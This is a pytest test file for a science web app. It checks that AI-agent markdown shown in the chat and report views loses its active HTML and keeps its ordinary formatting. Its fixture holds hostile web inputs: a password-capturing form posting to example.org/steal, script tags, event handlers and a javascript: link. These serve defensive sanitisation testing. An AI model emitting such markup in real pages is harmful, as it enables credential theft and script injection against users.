"""Agent markdown cannot add styles or interactive HTML to the job page."""

from html.parser import HTMLParser
from pathlib import Path

import pytest
from nicegui import ui
from nicegui.testing.user_simulation import user_simulation
from sqlalchemy.ext.asyncio import AsyncSession

from openscientist.database.models import Job, JobChatMessage, User
from openscientist.webapp_components.pages.job_detail.chat import _ChatTabController
from openscientist.webapp_components.pages.job_detail.common import _JobDetailContext
from openscientist.webapp_components.pages.job_detail.report import _render_report_markdown

_PAYLOAD = """# Findings

<style>body { display: none; }</style>
<form action="https://example.org/steal"><input name="password"><button>Sign in</button>
<textarea>Secret</textarea><select><option>Secret</option></select></form>
<script>alert('secret')</script>
<p style="position:fixed" onclick="alert(1)">Safe paragraph</p>
<a href="javascript:alert(1)">Unsafe link</a>
<img src="https://example.org/remote" onerror="alert(1)">

| Result | Value |
| --- | --- |
| Count | 42 |

```python
print("result")
```

[Reference](https://example.org/paper)

[Contact](mailto:science@example.org)

[Local](/web/jobs/example/report.html)

![Plot](/web/jobs/example/files/plot.png)

![Embedded](data:image/png;base64,iVBORw0KGgo=)
"""


class _Fragment(HTMLParser):
    def __init__(self, html: str) -> None:
        super().__init__()
        self.elements: list[tuple[str, dict[str, str | None]]] = []
        self.feed(html)

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.elements.append((tag, dict(attrs)))


@pytest.mark.asyncio
@pytest.mark.parametrize("renderer", ["assistant", "report"])
async def test_agent_markdown_removes_active_html_and_preserves_markdown(
    renderer: str, db_session: AsyncSession, webapp_user: User, tmp_path: Path
) -> None:
    job = Job(owner_id=webapp_user.id, research_question="Safe rendering", status="completed")
    db_session.add(job)
    await db_session.flush()
    message = JobChatMessage(job_id=job.id, role="assistant", content=_PAYLOAD)
    db_session.add(message)
    await db_session.flush()
    context = _JobDetailContext(
        job_id=str(job.id),
        user_id=str(webapp_user.id),
        job_manager=None,
        job_info=job,
        is_owner=True,
        can_edit=True,
        owner_name=None,
        job_dir=tmp_path,
        ks_data=None,
        action_counts={},
        ks_load_error=None,
        spend=0,
        spend_visible=False,
        state={},
        share_dialog=None,
        delete_dialog=None,
        notifications_dialog=None,
        attachments=[],
    )
    report_path = tmp_path / "final_report.md"
    report_path.write_text(message.content)

    async def page() -> None:
        if renderer == "assistant":
            _ChatTabController(context)._render_message_bubble(message.role, message.content)
        else:
            await _render_report_markdown(ui.column(), report_path)

    async with user_simulation(root=page) as browser:
        client = await browser.open("/")
        await browser.should_see("Findings")
        [markdown] = [e for e in client.elements.values() if isinstance(e, ui.markdown)]
        fragment = _Fragment(markdown.props["innerHTML"])
        tags = {tag for tag, _ in fragment.elements}
        assert not tags.intersection(
            {"style", "form", "input", "button", "textarea", "select", "script"}
        )
        assert {"h1", "p", "table", "th", "td", "pre", "code", "a", "img"} <= tags
        for _, attrs in fragment.elements:
            assert "style" not in attrs
            assert not any(name.startswith("on") for name in attrs)
            assert not (attrs.get("href") or "").startswith("javascript:")
        links = [attrs for tag, attrs in fragment.elements if tag == "a"]
        for href in (
            "https://example.org/paper",
            "mailto:science@example.org",
            "/web/jobs/example/report.html",
        ):
            [link] = [attrs for attrs in links if attrs.get("href") == href]
            assert "noopener" in (link.get("rel") or "").split()
        image_sources = {attrs.get("src") for tag, attrs in fragment.elements if tag == "img"}
        assert "https://example.org/remote" not in image_sources
        assert "/web/jobs/example/files/plot.png" in image_sources
        assert "data:image/png;base64,iVBORw0KGgo=" in image_sources
